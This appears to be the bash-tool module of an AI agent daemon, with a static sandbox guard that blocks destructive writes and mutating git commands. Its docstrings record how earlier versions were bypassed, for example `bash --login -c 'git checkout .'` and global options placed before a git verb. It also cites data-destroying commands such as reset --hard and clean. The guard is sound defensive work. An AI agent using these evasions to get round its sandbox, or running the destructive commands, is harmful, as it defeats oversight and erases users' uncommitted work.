        # Skip global options (and the separate value of options that take one).
        while j < len(tokens):
            nxt = tokens[j]
            if nxt in _GIT_GLOBAL_WITH_VALUE:
                j += 2
                continue
            if nxt.startswith("-"):
                j += 1
                continue
            break
        if j < len(tokens):
            out.append((tokens[j], tokens[j + 1:]))
        i = j + 1
    return out


def _git_invocation_is_mutator(verb: str, rest: list[str]) -> str | None:
    """Classify one resolved git invocation. Returns the offending verb, or None.

    **Fail-closed**: a verb is allowed only when it is known to print
    information. Anything else — an unlisted verb, and therefore every
    subcommand git adds in future — blocks. The blocklist this replaced had the
    default inverted, which made the safe set the *unlisted* one; with 169
    subcommands that can never be enumerated, that is a guard against only the
    names someone happened to type.

    The decision is on the *effect*, not the spelling: read-only inspections
    (`git stash list`, `git worktree list`, `git submodule status`,
    `git branch -a`, `git remote -v`, `git config -l`) are read from the
    resolved verb + flags, so they stay allowed without an exemption pattern to
    keep in sync.
    """
    if verb in _GIT_READ_VERBS:
        return None
    if verb in _GIT_SHAPE_DECIDED:
        return _shape_decided_verdict(verb, rest)
    # Unlisted verb: block. This is the fail-closed default and the whole point
    # of the design — `checkout-index`, `mktree`, `filter-branch`, `init`,
    # `clone`, `revert`, and any future subcommand land here.
    return verb


def _shape_decided_verdict(verb: str, rest: list[str]) -> str | None:
    """The verdict for a verb whose subcommand / flags decide its effect.

    Returns the verb when the invocation writes, or None when it is a proven
    read. Every branch treats "not recognisably a read" as a write.
    """
    positional = [t for t in rest if not t.startswith("-")]
    sub = next(iter(positional), None)
    if verb == "stash":
        # `stash list` / `stash show` read; a bare `git stash` saves and cleans
        # the tree, so it writes.
        return None if sub in ("list", "show") else verb
    if verb == "worktree":
        # `worktree list` reads; a bare `git worktree` only prints usage.
        return None if sub is None or sub == "list" else verb
    if verb == "submodule":
        # `submodule status` / `summary` read; a bare `git submodule` only
        # prints usage.
        return None if sub is None or sub in ("status", "summary") else verb
    if verb == "remote":
        # `remote -v` / `show` / `get-url` read; `set-url`/`add`/`remove` write.
        return None if sub is None or sub in ("show", "get-url", "v") else verb
    if verb in ("branch", "tag"):
        # A listing flag makes this a read even with a pattern argument; a
        # delete/force/move flag makes it a write.
        if any(t in _GIT_WRITE_FLAGS for t in rest):
            return verb
        if any(t in _GIT_LIST_FLAGS for t in rest):
            return None
        # `git branch <name>` / `git tag <name>` create; only the bare form
        # (no positional argument at all) is the listing read.
        return None if not positional else verb
    if verb == "config":
        if any(t in _GIT_CONFIG_READ_FLAGS for t in rest):
            return None
        # `git config <key>` with no value is a read; `key=value` or `--set`
        # writes. A lone positional key is ambiguous, so treat a single
        # positional as a read and anything that looks like an assignment as
        # a write.
        if any("=" in t for t in positional):
            return verb
        return None if len(positional) <= 1 else verb
    if verb == "hash-object":
        # `git hash-object <file>` computes and prints an object name — a read.
        # `-w` additionally writes the object into the database.
        return verb if "-w" in rest else None
    return verb


def _is_env_assignment(tok: str) -> bool:
    """Whether ``tok`` is a shell variable assignment (`FOO=1`, `PATH=/x:$PATH`).

    Distinguished from a command word so `FOO=1 git checkout .` still reads as a
    git invocation: the shell strips leading assignments and runs what follows.
    """
    return bool(_ENV_ASSIGNMENT_RE.match(tok))


def _basename(tok: str) -> str:
    """The command word without its directory prefix or extension.

    `/usr/bin/git` and `git.exe` name the same program as `git`; a guard that
    only recognises the bare spelling is a guard against the polite form of
    the command. (On Windows the shell resolves `git` to `git.exe`, so the
    extension form is the one that actually runs there.)

    A leading `VAR=` is stripped for the same reason: `FOO=1 git checkout .`
    runs git, and the assignment is not part of the program word. Command
    substitution used to need stripping here too, and does not any more — the
    tokenizer now splits on the backtick, which is the *structural* fix; keeping
    a strip here as well would have hidden the fact that the token stream was
    wrong, and would only have covered the substitutions that happen to wrap the
    program word rather than the shape.
    """
    base = tok.rsplit("/", 1)[-1].rsplit("\\", 1)[-1]
    if base.lower().endswith(".exe"):
        base = base[:-4]
    if "=" in base:
        head, _, tail = base.partition("=")
        if head.isidentifier():
            base = tail
    return base


def _nested_command_texts(tokens: list[str]) -> list[str]:
    """The command strings a shell will itself re-parse out of ``tokens``.

    Returns the argument of every `sh -c <text>` (and the other wrapper
    shells) and every `eval <text>`, so the caller can recurse into them.

    Why this is needed rather than optional: tokenising splits a command into
    an outer invocation plus an opaque string literal, and a string literal is
    data. `sh -c 'git checkout .'` therefore parses as the command `sh` with a
    quoted payload — no git invocation at all. The pre-parsing guard blocked
    it, because a raw-text regex over the whole line did not care where the
    word sat. Dropping that scan silently made 5 wrapper shapes writable under
    read-only (measured 2026-09-12 against master: `sh -c` / `bash -c` /
    `zsh -c` / `dash -c` / `eval` all went from blocked to allowed), which is
    the one direction this guard must never move in. So the parsed design has
    to model the nesting explicitly.

    The wrapper is recognised by its *name*, and then **every remaining token
    is treated as a possible payload** — the same over-approximation `eval`
    already gets. Locating the `-c` flag instead looks tighter but is unsound:
    it requires enumerating how a flag may be spelled, and the enumeration is
    always incomplete. Measured 2026-09-12 against the first version of this
    function, which walked to `-c`:

      - short forms worked (`bash -c`, `bash -lc`, `bash -x -c`);
      - but a **long option** or an **option value** ended the walk before
        `-c` was ever reached, so `bash --login -c 'git checkout .'`,
        `bash --noprofile -c ...`, `bash --posix -c ...`, `bash -o pipefail
        -c ...` and `zsh --login -c ...` were all ALLOWED under read-only —
        9 of 14 wrapper shapes, every one of them a mutator. Driven end to
        end through `BashTool.execute`, 3 of 4 destroyed uncommitted work
        that master blocks.
      - this is the #461 class exactly: matching one spelling of a class while
        the other spelling passes. A guard cannot win that enumeration, so it
        must not depend on it.

    Over-approximating costs only that a wrapper followed by a non-command
    (e.g. `bash script.sh`) recurses into a filename, which parses to no git
    invocation and stays allowed. Erring toward *blocking* is the safe
    direction for this guard; erring toward data loss is not.
    """
    out: list[str] = []
    for i, tok in enumerate(tokens):
        if _basename(tok) in _SHELL_WRAPPERS:
            # `sh -c <text>` — take everything after the wrapper and let the
            # recursive parse decide what is a command. Do NOT locate `-c`:
            # every way of spelling an option before it is a hole.
            out.extend(tokens[i + 1:])
        elif _basename(tok) in _SHELL_EVALUATORS:
            # `eval <text...>`: every remaining token is re-parsed as a command.
            out.extend(tokens[i + 1:])
    return out


def _find_git_mutator(cmd: str, _depth: int = 0) -> str | None:
    """The first mutating git verb in ``cmd``, or None when there is none.

    Parses rather than scans (issues #1156 + #1159): every `git` invocation in
    a chained command is resolved to its verb and classified by effect. Returns
    a human-readable phrase for the block reason.

    Recurses into shell execution contexts (`sh -c <text>`, `eval <text>`), so
    a mutator that the shell will run is judged wherever it is written. Depth
    is capped rather than trusted: nesting is bounded by the shell itself, and
    a guard must terminate on adversarial input.
    """
    tokens = _tokenize_command(cmd)
    for verb, rest in _git_verbs(tokens):
        hit = _git_invocation_is_mutator(verb, rest)
        if hit:
            return f"git {hit}"
    if _depth < 3:
        for nested in _nested_command_texts(tokens):
            hit = _find_git_mutator(nested, _depth + 1)
            if hit:
                return hit
    return None


def _check_sandbox(cmd: str, mode: str, workdir: str | None = None) -> tuple[bool, str | None, str]:
    """Static sandbox check for a bash command (rant 2026-08-20T15:46:50).

    Returns ``(allowed, blocked_reason, enforcement)``:
      - danger-full-access → (True, None, "full") — no checks, current behavior.
      - read-only → blocks every destructive write (rm -r / rmdir / mv /
        cp -r and shell redirects to any non-/dev/null target).
      - workspace-write → blocks destructive writes to protected daemon
        files, to ``~/.emrg`` itself, and to absolute paths outside the
        workspace root (the OS temp dir is allowed — mirrors dsh's
        workspace + backend-promised temp area).

    Heuristic by design: static scan only, no OS-level boundary — checked
    modes honestly report enforcement="partial".
    """
    if mode not in SANDBOX_MODES:
        return False, f"invalid sandbox mode {mode!r}", "partial"
    if mode == "danger-full-access":
        return True, None, "full"

    # Containment-escape guard (issue #1102): destination-based, applies to
    # both checked tiers. A metadata-credential fetch is a READ and escapes
    # the write-target scan below — it must run before the early returns.
    escape = _check_containment_escape(cmd)
    if escape:
        return False, escape, "partial"

    targets = _extract_write_targets(cmd)
    if mode == "read-only":
        for t in targets:
            if t != "/dev/null":
                return False, (
                    f"read-only sandbox: blocked destructive write targeting {t!r}"
                ), "partial"
        # Git mutators are blocked too — the 2026-08-20 data-loss commands
        # (stash / checkout . / reset --hard / clean) write no file targets
        # and escaped the target scan (community issue #979). Also blocks
        # working-tree writers: apply / am / archive / submodule / worktree.
        #
        # Decided by **parsed verb**, not raw text (issues #1156 + #1159): a
        # global option between `git` and the subcommand used to defeat the
        # alternation, `git read-tree -u --reset` was never on the list, and
        # a command merely *mentioning* a mutator was refused. Chained commands
        # are judged per invocation, so `git stash list && git stash drop` still
        # blocks while a bare `git stash list` reads.
        hit = _find_git_mutator(cmd)
        if hit:
            return False, (
                f"read-only sandbox: blocked git mutating command {hit!r} "
                "(dirty-tree guard, community issue #979)"
            ), "partial"
        return True, None, "partial"

    # workspace-write
    if not targets:
        return True, None, "partial"
    protected = _protected_paths()
    emrg_home = os.path.realpath(os.path.expanduser("~/.emrg"))
    workdir_real = os.path.realpath(workdir) if workdir else None
    for t in targets:
        if t == "/dev/null":
            continue
        expanded = os.path.expanduser(t)
        if not _is_absolute_path(expanded):
            # Relative target: assumed in-workspace (cwd = the workspace root).
            continue
        real = os.path.realpath(expanded)
        if real in protected:
            return False, (
                f"workspace-write sandbox: blocked write to protected daemon file {t!r}"
            ), "partial"
        if real == emrg_home:
            return False, (
                f"workspace-write sandbox: blocked destructive write to {t!r} "
                "(would erase the daemon's data directory)"
            ), "partial"
        allowed_srcs = [workdir_real] if workdir_real else []
        allowed_srcs += list(_trusted_write_zones())
        allowed_srcs += list(_temp_write_roots())
        if not any(
            src and (_is_within(real, src) or real == src) for src in allowed_srcs
        ):
            return False, (
                f"workspace-write sandbox: blocked write outside workspace {t!r}"
            ), "partial"
    return True, None, "partial"


def _decode_output(data: bytes, os_name: str | None = None) -> str:
    """Decode subprocess output bytes without corrupting non-UTF-8 text.

    POSIX: subprocess output is UTF-8 — unchanged behavior.

    Windows: cmd.exe/dir/echo output uses the console locale code page
    (GBK/cp936 on zh-CN), while git/gh emit UTF-8. Both must decode
    correctly, so we try the locale encoding **strictly** first and fall
    back to UTF-8 (also strict), then to UTF-8 with replacement as a last
    resort. A non-strict first attempt would silently mojibake UTF-8
    output and never reach the fallback (rant 2026-08-08T09:35:30 —
    U+FFFD garbage from decoding GBK bytes as UTF-8).

    ``os_name`` is injectable for tests (defaults to ``os.name``).
    """
    if not data:
        return ""
    name = os_name or os.name
    if name == "nt":
        enc = locale.getpreferredencoding(False) or "utf-8"
        for candidate in (enc, "utf-8"):
            try:
                return data.decode(candidate)  # strict
            except (LookupError, UnicodeDecodeError):
                continue
    return data.decode("utf-8", errors="replace")


class BashTool(ToolExecutor):
    """Execute shell commands via asyncio subprocess."""

    def definition(self) -> ToolDefinition:
        return ToolDefinition(
            name="bash",
            description=(
                "Execute a shell command and return stdout and stderr. "
                "Use for running tests, git commands, listing files, "
                "installing packages, and other shell operations. "
                "Commands run in the working directory by default; "
                "use the `workdir` parameter to override."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "command": {
                        "type": "string",
                        "description": "The shell command to execute. Bash heredocs "
                        "(cmd <<'EOF' ... EOF) are supported on all platforms "
                        "— on Windows they are auto-translated to stdin redirects.",
                    },
                    "timeout": {
                        "type": "integer",
                        "description": "Timeout in seconds (default: 30).",
                    },
                    "workdir": {
                        "type": "string",
                        "description": "Working directory for the command (default: project root).",
                    },
                    "intent": {
                        "type": "string",
                        "description": "The purpose of this call: why you are invoking it and what you want to achieve. "
                        "One human-readable sentence, e.g. 'check how billing is implemented in billing.rs'.",
                    },
                },
                "required": ["command", "intent"],
            },
        )

    async def execute(self, arguments: dict) -> ToolResult:
        cmd = arguments.get("command", "")
        timeout = arguments.get("timeout", 30)
        workdir = arguments.get("workdir", None)
        # Sandbox tier — daemon-injected per task config (the agent cannot
        # choose its own sandbox; rant 2026-08-20T15:46:50).
        sandbox = arguments.get("sandbox")

        if not cmd:
            return ToolResult(name="bash", content="Error: no command provided", error=True)

        # Static file-level isolation check (rant 2026-08-20T15:46:50).
        sandbox_tag: str | None = None
        containment_warning: str | None = None
        if sandbox and sandbox != "danger-full-access":
            allowed, reason, enforcement = _check_sandbox(cmd, sandbox, workdir)
            if not allowed:
                logger.info("bash: BLOCKED by %s sandbox: %s", sandbox, reason)
                return ToolResult(
                    name="bash",
                    content=(
                        f"⛔ [sandbox:{sandbox} enforcement={enforcement}] "
                        f"{reason} — command not executed"
                    ),
                    error=True,
                )
            sandbox_tag = f"[sandbox:{sandbox} enforcement={enforcement}]"
            logger.debug("bash: sandbox %s check passed", sandbox)
        elif sandbox == "danger-full-access":
            # Issue #1102: the danger tier opts into no blocking, but a
            # containment-escape command still gets a visible warning so the
            # caller can spot credential exfiltration in the tool result.
            containment_warning = _check_containment_escape(cmd)

        logger.debug("bash: running %r (timeout=%ds)", cmd[:100], timeout)

        # Windows: cmd.exe cannot parse bash heredocs — translate the first
        # one to a stdin redirect (host sessions 2026-08-14T21:26/21:36 hit
        # "此时不应有 <<" with browser-harness <<'PY'). POSIX unchanged.
        temp_path = None
        if os.name == "nt":
            cmd, temp_path = _translate_windows_heredocs(cmd)

        try:
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                cwd=workdir,
                # Non-interactive daemon: git/gh children must fail fast
                # silently, never spawn GCM/askpass popups (rant
                # 2026-08-07T10:17:27).
                env=no_prompt_env(),
                preexec_fn=os.setsid if os.name != "nt" else None,
                # Windows: background daemon children must never pop a
                # console window (rant 2026-08-09T13:16:36 — cmd-window
                # storm; bash tool was a top contributor).
                **win32_no_window_kwargs(),
            )
            try:
                stdout, stderr = await asyncio.wait_for(
                    proc.communicate(), timeout=timeout
                )
            except asyncio.TimeoutError:
                # Kill entire process group to prevent orphaned children
                try:
                    if os.name != "nt":
                        os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
                    else:
                        proc.kill()
                except (ProcessLookupError, OSError):
                    proc.kill()
                await proc.wait()
                return ToolResult(
                    name="bash",
                    content=f"Command timed out after {timeout}s: {cmd[:100]}",
                    error=True,
                )
            finally:
                if temp_path:
                    try:
                        os.unlink(temp_path)
                    except OSError:
                        pass

            out = _decode_output(stdout).rstrip()
            err = _decode_output(stderr).rstrip()

            # Smart truncation: keep stderr intact (errors are critical),
            # truncate stdout with head+tail when output exceeds limit.
            # This ensures build/test errors at the tail aren't lost.
            ERR_MAX = 30_000  # Always keep stderr up to this
            HEAD_TAIL_RATIO = 0.6  # 60% head, 40% tail
            _SEP = "\n[stderr]\n"  # 10 chars, separator prefix

            if len(err) > ERR_MAX:
                half = ERR_MAX // 2
                err = (
                    f"{err[:half]}\n\n"
                    f"... [stderr truncated: {len(err)} → {ERR_MAX} chars, head+tail kept]"
                    f"\n\n{err[-half:]}"
                )

            # Calculate remaining budget for stdout (accounting for separator)
            err_overhead = len(_SEP) if (out and err) else 0
            remaining = MAX_OUTPUT_CHARS - len(err) - err_overhead
            if remaining < 2000 and err:
                # stderr consumed most budget — truncate stderr further
                remaining = MAX_OUTPUT_CHARS // 2
                err = err[:remaining] + (
                    "\n\n... [stderr truncated to make room for stdout]"
                )

            if out and len(out) > remaining:
                head_chars = int(remaining * HEAD_TAIL_RATIO)
                tail_chars = remaining - head_chars - 200  # message overhead
                if tail_chars < 500:
                    out = out[:remaining - 50] + (
                        f"\n\n... [stdout truncated: {len(out)} → {remaining} chars]"
                    )
                else:
                    out = (
                        f"{out[:head_chars]}\n\n"
                        f"... [{len(out) - remaining} chars omitted] ..."
                        f"\n\n{out[-tail_chars:]}"
                    )

            parts: list[str] = []
            if out:
                parts.append(out)
            if err:
                parts.append(f"[stderr]\n{err}")
            if not parts:
                parts.append("(no output)")
            result = "\n".join(parts)
            if sandbox_tag:
                result = f"{sandbox_tag} ok\n{result}"
            if containment_warning:
                result += (
                    f"\n⚠️ [sandbox:danger-full-access] {containment_warning} "
                    "— executed anyway (danger tier opts into no blocking)"
                )
            return ToolResult(name="bash", content=result)
        except FileNotFoundError:
            return ToolResult(
                name="bash",
                content=f"Command not found: {cmd[:100]}",
                error=True,
            )
        except OSError as e:
            logger.warning("bash error: %s", e)
            return ToolResult(name="bash", content=f"Error: {e}", error=True)
